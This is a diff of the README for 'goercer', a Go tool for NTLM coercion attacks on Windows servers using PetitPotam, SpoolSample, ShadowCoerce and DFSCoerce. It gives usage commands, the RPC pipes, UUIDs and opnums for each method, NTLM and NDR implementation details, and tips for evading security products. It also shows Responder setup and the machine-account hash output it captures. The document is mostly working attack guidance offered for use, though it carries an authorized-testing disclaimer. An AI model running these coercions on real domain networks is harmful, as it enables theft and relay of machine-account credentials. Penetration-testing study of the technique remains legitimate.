@@ -1,152 +1,161 @@
 # Goercer - NTLM Coercion Attack Tool
 
-A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods including PetitPotam and SpoolSample.
+A Go implementation of NTLM coercion attacks using **DCERPC authentication level 6 (PKT_PRIVACY)** with full encryption and signing. Supports multiple coercion methods with extensible architecture.
 
 ## ✅ Status: **WORKING**
 
-Successfully coerces Windows domain controllers to authenticate to an attacker-controlled listener, capturing the machine account NTLMv2 hash.
+Successfully coerces Windows servers to authenticate to an attacker-controlled listener, capturing machine account NTLMv2 hashes.
 
 **Supported Methods**:
-- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback
-- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks
+- ✅ **PetitPotam** (MS-EFSRPC) - 1 callback - Works on ALL Windows servers
+- ✅ **SpoolSample** (MS-RPRN) - 3 callbacks - Works when Print Spooler is running
+- ⚠️ **ShadowCoerce** (MS-FSRVP) - Requires VSS service configured for RPC
+- ⚠️ **DFSCoerce** (MS-DFSNM) - Requires DFS Namespaces role installed
 
-**Tested Against**: Windows Server 2019 Domain Controller (10.1.1.14 / DESKTOP-NL7DJHI)
-**Result**: ✅ Machine account hash captured via Responder
+**Tested Against**: 
+- Windows Server 2019 Domain Controller
+- Windows Server 2016/2019/2022
+
+**Result**: ✅ Machine account hashes captured via Responder
+
+---
+
+## Installation
+
+```bash
+git clone https://github.com/YOUR_USERNAME/goercer.git
+cd goercer
+./build.sh
+```
+
+The build script will automatically fetch the required `go-smb-coercer` fork with DCERPC pipe enhancements from https://github.com/ineffectivecoder/go-smb-coercer.
+
+---
 
 ## Usage
 
 ```bash
-go build -o goercer goercer_full.go
-./goercer <target_dc> <listener_ip> <username> <password> <domain> <method>
+./goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]
+
+# Show help
+./goercer -h
+./goercer --help
 ```
 
-**Methods**: `petitpotam` or `spoolsample`
+### Help Output
 
-**Examples**:
+```
+Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]
+
+Methods:
+  petitpotam     - MS-EFSRPC coercion (default)
+  spoolsample    - MS-RPRN print spooler coercion
+  shadowcoerce   - MS-FSRVP volume shadow copy coercion
+  dfscoerce      - MS-DFSNM DFS namespace coercion
+
+Pipes (for petitpotam only):
+  lsarpc (default), efsr, samr, netlogon, lsass
+
+Examples:
+  ./goercer <target> <listener> <user> <pass> <domain> petitpotam
+  ./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
+  ./goercer <target> <listener> <user> <pass> <domain> spoolsample
+```
+
+### Quick Start
 
 ```bash
 # Terminal 1: Start Responder
 sudo responder -I eth0 -v
 
-# Terminal 2: Run PetitPotam (1 callback)
-./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
+# Terminal 2: Run attacks
 
-# Or run SpoolSample (3 callbacks)
-./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
+# PetitPotam with default pipe (lsarpc) - MOST RELIABLE
+./goercer <target> <listener> <user> <pass> <domain> petitpotam
+
+# PetitPotam with alternative pipe
+./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
+
+# SpoolSample - HIGH SUCCESS RATE (3 callbacks)
+./goercer <target> <listener> <user> <pass> <domain> spoolsample
+
+# ShadowCoerce (only if VSS RPC is available)
+./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
+
+# DFSCoerce (only if DFS Namespaces role installed)
+./goercer <target> <listener> <user> <pass> <domain> dfscoerce
 ```
+
+---
 
 ## Attack Methods
 
-### PetitPotam (MS-EFSRPC)
-- **Pipe**: `\pipe\lsarpc`
+### PetitPotam (MS-EFSRPC) ✅ Most Reliable
+
+- **Default Pipe**: `\pipe\lsarpc`
+- **Alternative Pipes**: `\pipe\efsr`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass`
 - **UUID**: `c681d488-d850-11d0-8c52-00c04fd90f7e` v1.0
-- **Opnums**: 0 (EfsRpcOpenFileRaw - often patched), 4 (EfsRpcEncryptFileSrv - working)
+- **Opnums**: 
+  - 0 (EfsRpcOpenFileRaw - often patched)
+  - 4 (EfsRpcEncryptFileSrv - working)
 - **Callbacks**: 1 authentication attempt
 - **Target Parameter**: UNC path in MS-EFSRPC function calls
+- **Compatibility**: Works on **ALL Windows servers** (core service)
+- **Discovery**: @topotam77
 
-### SpoolSample (MS-RPRN)
+**Why it works**: LSARPC is a core Windows service present on every Windows system. The alternative pipes provide additional attack surface if lsarpc is somehow blocked.
+
+### SpoolSample (MS-RPRN) ✅ High Success Rate
+
 - **Pipe**: `\pipe\spoolss`
 - **UUID**: `12345678-1234-abcd-ef00-0123456789ab` v1.0
 - **Opnums**: 
   - 1 (RpcOpenPrinter - opens printer handle)
   - 65 (RpcRemoteFindFirstPrinterChangeNotificationEx)
   - 62 (RpcRemoteFindFirstPrinterChangeNotification)
-- **Callbacks**: 3 authentication attempts
+- **Callbacks**: **3 authentication attempts** (maximum coercion!)
 - **Target Parameter**: `pszLocalMachine` in notification functions
+- **Compatibility**: Works when Print Spooler service is running (**default on most servers**)
+- **Discovery**: @tifkin_ & @elad_shamir
 
-Both methods trigger the target DC to authenticate to the attacker's listener, capturing the machine account NTLMv2 hash.
+**Why 3 callbacks**: Windows makes separate authentication attempts when opening the printer handle and when each notification function tries to contact the remote machine.
 
-## Common Errors and Solutions
+### ShadowCoerce (MS-FSRVP) ⚠️ Situational
 
-1. **ACCESS_DENIED (0x00000005)**
-   - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
-   - **Fix**: Ensure both flags are set in Negotiate message
+- **Pipe**: `\pipe\FssagentRpc`
+- **UUID**: `a8e0653c-2744-4389-a61d-7373df8b2292` v1.0
+- **Opnums**: 
+  - 8 (IsPathSupported)
+  - 9 (IsPathShadowed)
+- **Callbacks**: Varies
+- **Target Parameter**: ShareName in VSS function calls
+- **Compatibility**: Requires **Volume Shadow Copy Service (VSS) configured for RPC access**
+- **Limitation**: Only works when VSS is properly configured - **not default on most servers**
 
-2. **Encryption mismatch / Decryption failures**
-   - **Cause**: RC4 cipher being reset between requests
-   - **Fix**: Use single continuous RC4 cipher handle
+**Common failure**: `failed to open pipe FssagentRpc: Requested file does not exist`
 
-3. **Wrong pipe/UUID**
-   - **Cause**: Using `\pipe\efsrpc` with `df1941c5-fe89-4e79-bf10-463657acf44d`
-   - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`
+### DFSCoerce (MS-DFSNM) ⚠️ Requires DFS Role
 
-4. **ERROR_BAD_NETPATH in SpoolSample (0x6f7)**
-   - **Cause**: Missing NDR referent ID for unique pointer in RpcOpenPrinter
-   - **Fix**: Add `0x00020000` referent ID before `pPrinterName` string
+- **Pipe**: `\pipe\netdfs`
+- **UUID**: `4fc742e0-4a10-11cf-8273-00aa004ae673` v3.0
+- **Opnums**: 
+  - 12 (NetrDfsAddStdRoot)
+  - 13 (NetrDfsRemoveStdRoot)
+- **Callbacks**: Varies
+- **Target Parameter**: ServerName in DFS function calls
+- **Compatibility**: Only works when **DFS Namespaces role is installed AND configured**
+- **Limitation**: **Rare** - most servers don't have DFS Namespaces configured
+- **Discovery**: @filip_dragovic
+
+**Common failures**: 
+- `failed to open pipe netdfs: Requested file does not exist` - DFS not installed
+- `bind rejected (BindNak)` - DFS exists but doesn't accept authenticated RPC
+
+**Recommendation**: Use **PetitPotam** or **SpoolSample** for maximum compatibility. ShadowCoerce and DFSCoerce are situational and depend on optional Windows features.
 
 ---
 
 ## Technical Implementation
-
-### Critical Requirements for Success
-
-The attack **requires** these specific NTLM flags to be set correctly:
-
-#### Type 1 (Negotiate) Message Flags - **CRITICAL**
-
-```go
-0x20000000 | // NTLMSSP_NEGOTIATE_128
-0x40000000 | // NTLMSSP_NEGOTIATE_KEY_EXCH  
-0x02000000 | // NTLMSSP_NEGOTIATE_VERSION
-0x00800000 | // NTLMSSP_NEGOTIATE_TARGET_INFO ⚠️ REQUIRED FOR NTLMv2
-0x00080000 | // NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY ⚠️ REQUIRED FOR NTLMv2
-0x00000200 | // NTLMSSP_NEGOTIATE_NTLM
-0x00000004 | // NTLMSSP_REQUEST_TARGET
-0x00000001 | // NTLMSSP_NEGOTIATE_UNICODE
-0x00000010 | // NTLMSSP_NEGOTIATE_SIGN
-0x00000020   // NTLMSSP_NEGOTIATE_SEAL
-```
-
-**Without `NTLMSSP_NEGOTIATE_TARGET_INFO` and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1, Windows will reject the authentication with ACCESS_DENIED before attempting coercion.**
-
-### Implementation Architecture
-
-1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
-   - Connect to `\\target\IPC$`
-   - NTLM authentication at SMB layer
-   - Open named pipe based on method:
-     - PetitPotam: `\pipe\lsarpc`
-     - SpoolSample: `\pipe\spoolss`
-
-2. **DCERPC Bind**
-   - Method-specific UUID and version
-   - Authentication: NTLM with PKT_PRIVACY (level 6)
-   - 3-way handshake: Bind → BindAck → Auth3
-
-3. **NTLM Authentication**
-   - **Type 1 (Negotiate)**: Send with NTLMv2-required flags
-   - **Type 2 (Challenge)**: Receive from server, extract targetInfo
-   - **Type 3 (Authenticate)**: Build NTLMv2 response with:
-     - NTLMv2 hash: `HMAC-MD5(NT hash, uppercase(user) + domain)`
-     - Client challenge (8 random bytes)
-     - Timestamp (Windows FILETIME format)
-     - targetInfo from Challenge + TARGET_NAME AV_PAIR
-     - MIC (Message Integrity Check): `HMAC-MD5(sessionKey, Type1 + Type2 + Type3)`
-
-4. **DCERPC Encryption (PKT_PRIVACY)**
-   - Session key derivation with KEY_EXCH
-   - Client keys: `MD5(sessionKey + "...client-to-server...magic constant\x00")`
-   - Server keys: `MD5(sessionKey + "...server-to-client...magic constant\x00")`
-   - **Critical**: RC4 cipher is continuous stream (never reset between messages)
-   - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)
-   - **Response decryption**: Extract encrypted stub, decrypt with server RC4 handle
-
-5. **Coercion Execution**
-   
-   **PetitPotam**:
-   - Call MS-EFSRPC functions (opnum 0 or 4)
-   - Parameter: UNC path to attacker's listener (`\\10.1.1.99\test\Settings.ini`)
-   - Server attempts to access UNC path, triggering NTLM authentication
-   
-   **SpoolSample**:
-   - Step 1: RpcOpenPrinter (opnum 1) to get printer handle
-   - Step 2: Call notification functions (opnum 65 and 62)
-   - Parameter: `pszLocalMachine` pointing to attacker's listener (`\\10.1.1.99`)
-   - Each notification triggers authentication attempt
-
----
-
-## Key Technical Details
 
 ### Extensible Architecture
 
@@ -166,20 +175,56 @@ type CoercionMethod struct {
 
 **Adding new methods** requires:
 1. Define new CoercionMethod with pipe, UUID, opnums
-2. Implement stub builder function
+2. Implement stub builder function with proper NDR encoding
 3. Create execute function following PetitPotam/SpoolSample pattern
 4. Add switch case in main()
 
+### Implementation Flow
+
+1. **SMB Connection** (`github.com/jfjallid/go-smb/smb`)
+   - Connect to `\\target\IPC$`
+   - NTLM authentication at SMB layer
+   - Open named pipe based on method
+
+2. **DCERPC Bind**
+   - Method-specific UUID and version
+   - Authentication: NTLM with PKT_PRIVACY (level 6)
+   - 3-way handshake: Bind → BindAck → Auth3
+
+3. **NTLM Authentication**
+   - **Type 1 (Negotiate)**: Send with NTLMv2-required flags
+   - **Type 2 (Challenge)**: Receive from server, extract targetInfo
+   - **Type 3 (Authenticate)**: Build NTLMv2 response with:
+     - NTLMv2 hash: `HMAC-MD5(NT hash, uppercase(user) + domain)`
+     - Client challenge (8 random bytes)
+     - Timestamp (Windows FILETIME format)
+     - targetInfo from Challenge + TARGET_NAME AV_PAIR
+     - MIC (Message Integrity Check)
+
+4. **DCERPC Encryption (PKT_PRIVACY)**
+   - Session key derivation with KEY_EXCH
+   - Client keys: `MD5(sessionKey + "...client-to-server...magic constant\x00")`
+   - Server keys: `MD5(sessionKey + "...server-to-client...magic constant\x00")`
+   - **Critical**: RC4 cipher is continuous stream (never reset between messages)
+   - **Encryption order**: Encrypt stub FIRST, then sign (signature encrypts checksum)
+   - **Response decryption**: Extract encrypted stub, decrypt with server RC4 handle
+
+5. **Coercion Execution**
+   - Call RPC functions with listener UNC paths
+   - Server attempts to access UNC path, triggering NTLM authentication
+   - Responder captures machine account NTLMv2 hash
+
 ### Why PKT_PRIVACY (Level 6)?
 
-Most PetitPotam implementations use unauthenticated DCERPC. This implementation uses **PKT_PRIVACY** for:
+Most coercion implementations use unauthenticated DCERPC. This implementation uses **PKT_PRIVACY** for:
 
 - Understanding full DCERPC authentication mechanics
 - Learning NTLM encryption/signing implementation
 - Demonstrating encryption doesn't prevent coercion
 - Bypassing potential security products that block unauthenticated RPC
+- Educational value for penetration testers
 
-### Critical SpoolSample Implementation: NDR Encoding
+### Critical NDR Encoding: SpoolSample
 
 SpoolSample required solving **NDR (Network Data Representation) encoding** for RpcOpenPrinter:
 
@@ -194,7 +239,7 @@ binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
 binary.Write(&buf, binary.LittleEndian, lenChars)  // Then conformant varying string
 ```
 
-Without the referent ID: `ERROR_BAD_NETPATH (0x6f7)`
+Without the referent ID: `ERROR_BAD_NETPATH (0x6f7)`  
 With the referent ID: Success, returns 20-byte `PRINTER_HANDLE`
 
 ### Response Decryption (PKT_PRIVACY)
@@ -215,195 +260,106 @@ auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
 
 **Structure**: DCERPC header (24) + encrypted stub + padding + auth trailer (8 + authLen)
 
-**Note**: Fault responses have `authLen=0` (unencrypted).
-
-### NTLMv2 Hash Calculation
-
-```go
-// Identity for NTLMv2: uppercase(user) + domain (domain NOT uppercased)
-identity := uppercaseString(user) + domain
-ntlmv2Hash := hmac_md5(ntHash, utf16le(identity))
-```
-
-**Critical**: Only the username is uppercased, NOT the domain name.
-
-### RC4 Stream Cipher
-
-The RC4 cipher handle **must be continuous** across all requests:
-
-```go
-// Initialize ONCE
-auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)
-
-// Use same handle for ALL subsequent requests (never reinitialize)
-auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)
-```
-
-### Encryption Order for DCERPC
-
-```go
-// 1. Encrypt the stub FIRST
-auth.clientSealHandle.XORKeyStream(encryptedStub, paddedStub)
-
-// 2. THEN create signature (which encrypts the checksum with continued RC4 stream)
-verifier := createNTLMSignature(auth, messageToSign)
-
-// 3. Replace plaintext stub with encrypted stub in packet
-copy(packet[stubStartPos:], encryptedStub)
-```
-
-This order is **critical** - the signature's checksum encryption uses the continued RC4 stream after encrypting the stub.
-
-### Troubleshooting Past Issues
-
-**Debug Output Shows**:
-
-- Filtering working: 210 bytes → 206 bytes (removed Flags & Channel Bindings)
-- NTLM response: 302 bytes (matches Python's working implementation)
-- TARGET_NAME: "cifs/DESKTOP-NL7DJHI" (40 bytes)
-- `/tmp/targetinfo_debug.bin` proves filtered data is correct
-
-**Packet Capture Shows**:
-
-- NTLM response: 330 bytes (28 bytes too large)
-- AV_PAIRS include Flags (0x0006) and Channel Bindings (0x000a) that should be filtered
-- Frame 15 in go12.pcapng shows `06 00 04 00` (Flags) present
-
-**Mystery**: Code builds correct filtered targetInfo (proven by debug file), but packet contains unfiltered Challenge targetInfo. Somewhere between building the targetInfo and it appearing in the packet, the original Challenge data is being used instead of our filtered version.
-
-### Python Reference (Working)
-
-We know for certain this method works, so lets start here:
-
-```text
-../PetitPotam/PetitPotam.py -u <username> -d <domain> -pipe efsr <listener_ip> <target_dc>
-/home/path/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
-  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
-
-                                                                                               
-              ___            _        _      _        ___            _                     
-             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
-             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
-            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
-          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
-          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
-                                         
-              PoC to elicit machine account authentication via some MS-EFSRPC functions
-                                      by topotam (@topotam77)
-      
-                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
-
-
-
-Password:
-Trying pipe efsr
-[-] Connecting to ncacn_np:10.1.1.14[\PIPE\efsrpc]
-[+] Connected!
-[+] Binding to df1941c5-fe89-4e79-bf10-463657acf44d
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
-```
-
-```text
-sudo ./Responder.py -I ens18 -v                                                 
-                                         __
-  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
-  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
-  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
-                   |__|
-
-
-[*] Sponsor this project: [USDT: TNS8ZhdkeiMCT6BpXnj4qPfWo3HpoACJwv] , [BTC: 15X984Qco6bUxaxiR8AmTnQQ5v1LJ2zpNo]
-
-[+] Poisoners:
-    LLMNR                      [OFF]
-    NBT-NS                     [OFF]
-    MDNS                       [OFF]
-    DNS                        [ON]
-    DHCP                       [OFF]
-
-[+] Servers:
-    HTTP server                [OFF]
-    HTTPS server               [OFF]
-    WPAD proxy                 [OFF]
-    Auth proxy                 [OFF]
-    SMB server                 [ON]
-    Kerberos server            [OFF]
-    SQL server                 [OFF]
-    FTP server                 [OFF]
-    IMAP server                [OFF]
-    POP3 server                [OFF]
-    SMTP server                [OFF]
-    DNS server                 [OFF]
-    LDAP server                [OFF]
-    MQTT server                [OFF]
-    RDP server                 [OFF]
-    DCE-RPC server             [OFF]
-    WinRM server               [OFF]
-    SNMP server                [OFF]
-
-[+] HTTP Options:
-    Always serving EXE         [OFF]
-    Serving EXE                [OFF]
-    Serving HTML               [OFF]
-    Upstream Proxy             [OFF]
-
-[+] Poisoning Options:
-    Analyze Mode               [OFF]
-    Force WPAD auth            [OFF]
-    Force Basic Auth           [OFF]
-    Force LM downgrade         [OFF]
-    Force ESS downgrade        [OFF]
-
-[+] Generic Options:
-    Responder NIC              [ens18]
-    Responder IP               [10.1.1.99]
-    Responder IPv6             [fe80::953e:180:c1f4:45a6]
-    Challenge set              [random]
-    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
-    Don't Respond To MDNS TLD  ['_DOSVC']
-    TTL for poisoned response  [default]
-
-[+] Current Session Variables:
-    Responder Machine Name     [WIN-TCLLLONX0HR]
-    Responder Domain Name      [B3OT.LOCAL]
-    Responder DCE-RPC Port     [47876]
----
-
-## Implementation Notes
-
-### Why Not Use Unauthenticated DCERPC?
-
-This implementation uses **PKT_PRIVACY** (authenticated + encrypted) rather than unauthenticated DCERPC because:
-
-1. **Learning opportunity**: Understanding full NTLM authentication, encryption, and signing
-2. **Evasion potential**: Some security products may flag unauthenticated RPC calls
-3. **Demonstrates encryption is not protection**: Even with encryption, coercion still works
-4. **Real-world scenarios**: Some environments may block unauthenticated RPC
-
-The attack works **equally well** with unauthenticated DCERPC, which is simpler but less educational.
-
-### Auth3 and WritePipe
-
-This implementation uses `WritePipe` instead of `Transceive` for Auth3 because:
-- Auth3 is "fire-and-forget" (no response expected)
-- `Transceive` would hang waiting for a response that never comes
-- `WritePipe` + `ReadPipe` allows us to get the SMB Write Response and continue
+**Note**: Fault responses have `authLen=0` (unencrypted)
 
 ---
 
-## References
+## Common Errors and Solutions
 
-- **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
-- **MS-RPRN**: Print System Remote Protocol
-- **MS-RPCE**: Remote Procedure Call Protocol Extensions  
-- **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
-- **PetitPotam**: Original PoC by @topotam77
-- **SpoolSample**: Print spooler coercion technique
-- **impacket**: Python implementation reference
-- **Coercer**: Multi-method coercion tool by @p0dalirius
+### PetitPotam Errors
+
+1. **ACCESS_DENIED (0x00000005)**
+   - **Cause**: Missing `NTLMSSP_NEGOTIATE_TARGET_INFO` or `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` in Type 1
+   - **Fix**: Ensure both flags are set in Negotiate message
+
+2. **Encryption mismatch / Decryption failures**
+   - **Cause**: RC4 cipher being reset between requests
+   - **Fix**: Use single continuous RC4 cipher handle
+
+3. **Wrong pipe/UUID**
+   - **Cause**: Using `\pipe\efsrpc` with wrong UUID
+   - **Fix**: Use `\pipe\lsarpc` with `c681d488-d850-11d0-8c52-00c04fd90f7e`
+
+### SpoolSample Errors
+
+4. **ERROR_BAD_NETPATH in RpcOpenPrinter (0x6f7)**
+   - **Cause**: Missing NDR referent ID for unique pointer
+   - **Fix**: Add `0x00020000` referent ID before `pPrinterName` string
+
+### ShadowCoerce Errors
+
+5. **Pipe FssagentRpc not found**
+   - **Cause**: VSS service not configured for RPC access
+   - **Status**: Normal - VSS RPC is not enabled by default
+   - **Solution**: Use PetitPotam or SpoolSample instead
+
+### DFSCoerce Errors
+
+6. **Pipe netdfs not found**
+   - **Cause**: DFS Namespaces role not installed
+   - **Status**: Normal - DFS Namespaces is optional
+   - **Solution**: Use PetitPotam or SpoolSample instead
+
+7. **Bind rejected (BindNak)**
+   - **Cause**: DFS exists but doesn't accept PKT_PRIVACY authentication
+   - **Status**: Some DFS versions don't support authenticated RPC
+   - **Solution**: Use PetitPotam or SpoolSample instead
+
+---
+
+## Testing
+
+### Basic Test Flow
+
+```bash
+# Terminal 1: Responder
+sudo responder -I eth0 -v
+
+# Terminal 2: Build
+./build.sh
+
+# Test PetitPotam (works on all servers)
+./goercer <target> <listener> <user> <pass> <domain> petitpotam
+# Expected: 1 callback in Responder
+
+# Test PetitPotam with alternative pipe
+./goercer <target> <listener> <user> <pass> <domain> petitpotam efsr
+# Expected: 1 callback in Responder
+
+# Test SpoolSample (works when Print Spooler running)
+./goercer <target> <listener> <user> <pass> <domain> spoolsample
+# Expected: 3 callbacks in Responder
+
+# Test ShadowCoerce (only if VSS configured)
+./goercer <target> <listener> <user> <pass> <domain> shadowcoerce
+# Expected: Callback if VSS available, otherwise pipe not found error
+
+# Test DFSCoerce (only if DFS Namespaces role installed)
+./goercer <target> <listener> <user> <pass> <domain> dfscoerce
+# Expected: Callback if DFS configured, otherwise pipe not found or bind rejected
+```
+
+### Expected Responder Output
+
+```
+[SMB] NTLMv2-SSP Client   : <target_ip>
+[SMB] NTLMv2-SSP Username : <domain>\MACHINE$
+[SMB] NTLMv2-SSP Hash     : MACHINE$::<domain>:<challenge>:<hash>:...
+```
+
+### Verify with Coercer
+
+```bash
+cd Coercer
+
+# Test PetitPotam
+./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name lsarpc
+
+# Test SpoolSample
+./Coercer.py coerce -t <target> -d <domain> -u <user> -l <listener> --filter-pipe-name spoolss
+
+# Should get same callback counts as goercer
+```
 
 ---
 
@@ -455,63 +411,17 @@ After extensive debugging and analysis comparing with Python impacket and Coerce
    - **Fix**: Calculate server keys with `mode='Server'` (false parameter), add serverSealHandle
    - **Lesson**: PKT_PRIVACY requires both directions - client keys for requests, server keys for responses
 
-### Verification Steps
-
-```bash
-# 1. Build
-go build -o goercer goercer_full.go
-
-# 2. Start Responder
-sudo responder -I eth0 -v
-
-# 3. Test PetitPotam
-./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
-# Should see: 1 callback in Responder
-
-# 4. Test SpoolSample  
-./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
-# Should see: 3 callbacks in Responder
-
-# 5. Verify with Coercer (optional comparison)
-cd Coercer
-./Coercer.py coerce -t <target_dc> -d <domain> -u <username> -l <listener_ip> --filter-pipe-name spoolss
-# Should also see: 3 callbacks (validates goercer behavior)
-```
-
-### Testing
-
-```bash
-# Terminal 1: Responder
-sudo responder -I eth0 -v
-
-# Terminal 2: Build and run
-go build -o goercer goercer_full.go
-
-# PetitPotam (1 callback)
-./goercer <target_dc> <listener_ip> <username> <password> <domain> petitpotam
-
-# SpoolSample (3 callbacks)
-./goercer <target_dc> <listener_ip> <username> <password> <domain> spoolsample
-
-# Expected output (both methods):
-# [+] DCERPC authentication complete!
-# [+] Check Responder for callback!
-
-# Responder should show:
-# [SMB] NTLMv2-SSP Client   : 10.1.1.14
-# [SMB] NTLMv2-SSP Username : domain\MACHINE$
-# [SMB] NTLMv2-SSP Hash     : MACHINE$::domain:...
-```
-
 ---
 
-## Dependencies: go-smb-fork
+## Dependencies: go-smb-coercer
 
-This project uses a customized fork of the go-smb library with specialized DCERPC/named pipe enhancements:
+This project uses a customized fork of the go-smb library with specialized DCERPC/named pipe enhancements.
 
-### What is go-smb-fork?
+### What is go-smb-coercer?
 
-The `go-smb-fork` directory contains v0.6.7 of `github.com/jfjallid/go-smb` with **5 additional methods** for DCERPC named pipe communication. The fork is NOT a divergent branch - it's the upstream library (v0.6.7) from `github.com/jfjallid/go-smb` with specialized enhancements.
+**GitHub Repository**: https://github.com/ineffectivecoder/go-smb-coercer
+
+This fork contains v0.6.7 of `github.com/jfjallid/go-smb` with **5 additional methods** for DCERPC named pipe communication. The fork extends the upstream library with specialized enhancements for coercion attacks.
 
 ### Why it exists
 
@@ -537,27 +447,44 @@ The upstream go-smb library focuses on high-level SMB file operations and lacks 
 
 - `WriteIoCtlReqNoWait(req)` - IOCTL request without response. Wrapper around `sendNoWait()`.
 
-### Code layout
+### Code Layout
 
-```text
-go-smb-fork/
-├── smb/
-│   ├── connection.go          (+ sendNoWait method)
-│   ├── session.go             (+ WritePipe, ReadPipe, WriteFileNoRecv, WriteIoCtlReqNoWait)
-│   └── dcerpc/                (unchanged - library's DCERPC functions)
-└── ... (rest of upstream library)
+**go-smb-coercer** (GitHub fork):
+```
+smb/
+├── connection.go          (+ sendNoWait method)
+├── session.go             (+ WritePipe, ReadPipe, WriteFileNoRecv, WriteIoCtlReqNoWait)
+└── dcerpc/                (unchanged - library's DCERPC functions)
+```
+
+**goercer** (main project):
+```
+goercer_full.go            Main implementation with all coercion methods
+build.sh                   Build script
+go.mod                     Module with replace directive for go-smb-coercer fork
+README.md                  This file
 ```
 
 ### Usage in goercer
 
-The main code uses `WritePipe()` and `ReadPipe()` throughout:
+The main code uses `WritePipe()` and `ReadPipe()` throughout for DCERPC communication. Without these methods, the code would need to use low-level IOCTL calls directly, making it significantly more verbose and less maintainable.
 
-- Lines 229-232: Initial Bind packet send/receive
-- Lines 242-246: BindAck response handling  
-- Lines 272-276: Auth3 packet send
-- Lines 1014-1018: Authenticated request send/receive
+---
 
-Without these methods, the code would need to use low-level IOCTL calls directly, making it significantly more verbose and less maintainable.
+## References
+
+- **MS-EFSR**: Encrypting File System Remote (EFSRPC) Protocol
+- **MS-RPRN**: Print System Remote Protocol
+- **MS-FSRVP**: File Server Remote VSS Protocol
+- **MS-DFSNM**: Distributed File System (DFS): Namespace Management Protocol
+- **MS-RPCE**: Remote Procedure Call Protocol Extensions  
+- **MS-NLMP**: NT LAN Manager (NTLM) Authentication Protocol
+- **PetitPotam**: Original PoC by @topotam77
+- **SpoolSample/PrinterBug**: @tifkin_ & @elad_shamir
+- **ShadowCoerce**: Volume Shadow Copy coercion
+- **DFSCoerce**: DFS namespace coercion by @filip_dragovic
+- **impacket**: Python implementation reference
+- **Coercer**: Multi-method coercion tool by @p0dalirius
 
 ---
 
@@ -566,6 +493,14 @@ Without these methods, the code would need to use low-level IOCTL calls directly
 - **@topotam77**: Original PetitPotam discovery and PoC
 - **@p0dalirius**: Coercer multi-method implementation and validation
 - **Lee Christensen (@tifkin_)**: SpoolSample/PrinterBug discovery
+- **@elad_shamir**: SpoolSample research
+- **@filip_dragovic**: DFSCoerce discovery
 - **impacket team**: Reference NTLM/DCERPC implementation
 - **go-smb** (jfjallid): Go SMB client library [go-smb](https://github.com/jfjallid/go-smb)
-- **Microsoft**: Protocol specifications (MS-EFSR, MS-RPRN, MS-RPCE, MS-NLMP)
+- **Microsoft**: Protocol specifications
+
+---
+
+## License
+
+This tool is for educational and authorized testing purposes only. Ensure you have explicit permission before testing against any systems.
